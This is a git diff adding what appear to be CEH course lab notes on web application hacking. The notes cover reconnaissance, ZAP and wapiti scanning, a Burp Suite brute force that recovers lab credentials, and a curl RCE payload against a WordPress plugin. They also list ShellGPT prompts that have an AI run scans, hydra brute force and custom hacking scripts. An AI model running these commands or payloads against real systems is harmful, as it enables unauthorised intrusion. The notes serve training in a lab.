@@ -1706,9 +1706,9 @@ and then
 ```
 </details>
 
-<details>\
+<details>
 
-<sumamry>Gain Access to Target Web Server by Exploiting Log4j Vulnerability</summary>
+<summary>Gain Access to Target Web Server by Exploiting Log4j Vulnerability</summary>
 
 * we will install a vulnerable server in the Ubuntu machine
 ```console
@@ -1780,6 +1780,160 @@ website mirroring
 ```console
 :~$ sgpt --shell "Mirror the target website certifiedhacker.com" 
 also sgpt --shell "Mirror the target website https://certifiedhacker.com with httrack on desktop"
+
+```
+</details>
+
+# Hacking web application
+<details>
+<summary>Footprint the Web Infrastructure</summary>
+
+* Perform Web Application Reconnaissance using Nmap and Telnet
+
+```console
+:~$ nmap -T4 -A -v [Target Web Application]
+>www.moviescope.com
+>T4: specifies setting time template
+```
+* By telnet to perform banner grabbing
+```console
+:~$ telnet www.moviescope.com 80
+ type GET / HTTP/1.0 and press Enter two times.
+ > application to devolop a web server ASP.NET
+ ```
+ </details>
+
+ <details>
+ <summary>Perform Web Spidering using OWASP ZAP</summary>
+ OWASP ZED Application Proxy
+
+ ```console
+ :~$to lounch "zaproxy"
+
+ * Do you want to persist the ZAP Session? appears; select the No, I do not want to persist this session at this moment in time radio button and click Start.
+ * The OWASP ZAP main window appears. Under the Quick Start tab, click the Automated Scan option under Welcome to OWASP ZAP.
+ * enter the target website under the URL to attack field (here, www.moviescope.com). Leave the other settings to default and click the Attack button.
+ * You can observe various URLs under the Spider tab.
+ * After performing web spidering, OWASP ZAP performs active scanning. Navigate to the Active Scan tab to observe the various scanned links.
+ * Alerts tab, displaying the various vulnerabilities and issues associated with the target
+ * click on the Spider tab from the lower section of the window to view the web spidering information. By default, the URLs tab appears under the Spider tab.
+ * navigate to the Messages tab under the Spider tab to view more detailed information
+ ```
+ </details>
+
+ <details>
+ <summary> Perform Web Application Vulnerability Scanning using SmartScanner </summary>
+ ```console
+:~$windows 11
+on the Desktop. Search smartscanner in the search field, 
+Under REFERENCES section, press Ctrl and click on CWE-319 hyperlink .
+```
+</details>
+
+<details>
+<summary>Perform Web Application Attacks</summary>
+
+* Perform a Brute-force Attack using Burp Suite
+```console
+:~$ Ensure that the Wampserver is running in Windows Server 2022 machine. To run the WampServer, execute the following steps:
+* click Type here to search field on the Desktop, search for wampserver64
+* in parrot
+Mozilla Firefox web browser and go to http://10.10.1.22:8080/CEH/wp-login.php?.
+Now, we shall set up a Burp Suite proxy by first configuring the proxy settings of the browser
+in browser go to setting and search for proxy
+* The Connection Settings window appears; select the Manual proxy configuration radio button and specify the HTTP Proxy as 127.0.0.1 and the Port as 8080. Tick the Also use this proxy for HTTPS checkbox and click OK. Close the Settings tab and minimize the browser window.
+* Now, minimize the browser window, click the Applications menu form the top left corner of Desktop, and navigate to Pentesting --> Web Application Analysis --> Web Application Proxies --> Burpsuite CE to launch the Burpsuite CE application.
+* The Burp Suite main window appears; click the Proxy tab from the available options in the top section of the window.
+Turn the interception on if it is off.
+* Switch back to the browser window. On the login page of the target WordPress website, type random credentials, here admin and password. Click the Log In button.
+* Now, right-click anywhere on the HTTP request window, and from the context menu, click Send to Intruder.
+then go to intruder tab
+Click the Clear § button from the right-pane to clear the default payload values.
+* Once you clear the default payload values, select Cluster bomb from the Attack type drop-down list.
+* now we have to add the & symbol to both username and password like &user& &password& by using add button
+Once the username and password payloads are added. The symbol '§' will be added at the start and end of the selected payload values.
+* Navigate to the Payloads tab under the Intruder tab and ensure that under the Payload Sets section, the Payload set is selected as 1, and the Payload type is selected as Simple list.
+* Under the Payload settings [Simple list] section, click the Load… button.
+* A file selection window appears; navigate to the location /home/attacker/Desktop/CEHv13 Module 14 Hacking Web Applications/Wordlist, select the username.txt file, and click the Open button.
+* Similarly, load a password file for the payload set 2. To do so, under the Payload Sets section, select the Payload set as 2 from the drop-down options and ensure that the Payload type is selected as Simple list.
+the do the same here select password file
+* then hit start attack
+* After the progress bar completes, scroll down and observe the different values of Status and Length. Here, Status=302 and Length= 1155.
+thats the right password admin and qwerty@123
+```
+</details>
+<details>
+<summary>Perform Remote Code Execution (RCE) Attack</summary>
+
+```console
+:~$ windows server 2022
+Click Type here to search field on the Desktop, search for wampserver64 in the search bar and select Wampserver64 from the results.
+click on hidden icon and make sure that wampserver64 is running
+Now, open any web browser, and go to http://10.10.1.22:8080/CEH/wp-login.php? (here, we are using Mozilla Firefox).
+here we are opened as victim
+Hover your mouse cursor on Plugins in the left pane and click Installed Plugins, as shown in the screenshot.
+In the Plugins page, observe that User Post Gallery is installed. Click Activate under the User Post Gallery plugin to activate the plugin.
+* switch to parrot security machine
+Open Mozilla Firefox web browser and go to https://wpscan.com/ and login to the wpscan account that you have created in previous task.
+that is register yourself to wpscan and free use
+copy the api token
+* open parrot security machine and super user and cd
+*In the Terminal window, run wpscan --url http://10.10.1.22:8080/CEH --api-token [API Token from Step#13] command.
+as we identified RCE (remote code execution) now we are exploiting it
+* To perform RCE attack, run curl -i 'http://10.10.1.22:8080/CEH/wp-admin/admin-ajax.php?action=upg_datatable&field=field:exec:whoami:NULL:NULL' command.
+```
+</details>
+<details>
+<summary>Detect Web Application Vulnerabilities using Various Web Application Security Tools</summary>
+
+* Detect web application vulnerabilities using wapiti web application security scanner
+```console
+:~$in parrot machine
+terminal window run cd wapiti command to navigate into wapiti directory and 
+run python3 -m venv wapiti3 
+Now, run . wapiti3/bin/activate   (.)
+Run pip install . command to install wapiti web application security scanner. (.)
+After installing the tool run wapiti -u https://www.certifiedhacker.com
+to see scanned report
+ cd /root/.wapiti/generated_report/
+ ls
+ cp certifiedhacker.com_xxxxxxxx_xxxx.html /home/attacker/ 
+ Open a new terminal and run firefox certifiedhacker.com_xxxxxxxx_xxxx.html
+ ```
+ </details>
+ <details>
+ <summary>with AI</summary>
+
+ ```console
+ :~$ --shell "Check if the target url www.certifiedhacker.com has web application firewall"** command to detect WAF using ShellGPT.
+
+ sgpt --shell "Check if the target url https://www.certifiedhacker.com is protected with web application firewall using wafwoof"
+
+ sgpt --shell "Use load balancing detector on target domain yahoo.com." 
+
+ To identify server side technologies using ShellGPT run sgpt --chat HWA --shell "Launch whatweb on the target website www.moviescope.com to perform website footprinting. Run a verbose scan and print the output. Save the results in file whatweb_log.txt." command.
+
+ gpt --shell "Perform the Vulnerability scan on the target url www.moviescope.com"
+
+ sgpt --shell "Perform the Vulnerability scan on the target url www.moviescope.com using nmap"
+
+ To perform a vulnerability scan on web application using Sniper tool run sgpt --shell "Use Sn1per tool and scan the target url www.moviescope.com for web vulnerabilities and save result in file scan3.txt" command.
+
+ To identify files of a web application run sgpt --shell "Scan the web content of target url www.moviescope.com using Dirb" 
+
+ sgpt --shell "Scan the web content of target url www.moviescope.com using Gobuster" >> to identify directories
+
+
+ To perform FTP bruteforce attack run sgpt --shell "Attempt FTP login on target IP 10.10.1.11 with hydra using usernames and passwords file from /home/attacker/Wordlists" 
+
+ Run sgpt --chat wah --shell "create and run a custom script for web application footprinting and vulnerability scanning. The target url is www.certifiedhacker.com" to automate web application hacking tasks with custom scripts.
+
+
+To create a custom python script for web application scanning run sgpt --chat wah --shell "create and run a custom python script for web application footprinting and vulnerability scanning. The target url is www.certifiedhacker.com" command.
+
+To create a custom python script for web application scanning run sgpt --chat wah --shell "create and run a custom python script which will run web application footprinting tasks to gather information and then use this information to perform vulnerability scanning on target url is www.certifiedhacker.com" 
+
+To perform Web application fuzz testing using ShellGPT run sgpt --shell "Fuzz the target url www.moviescope.com using Wfuzz tool" 
 
 ```
 </details>
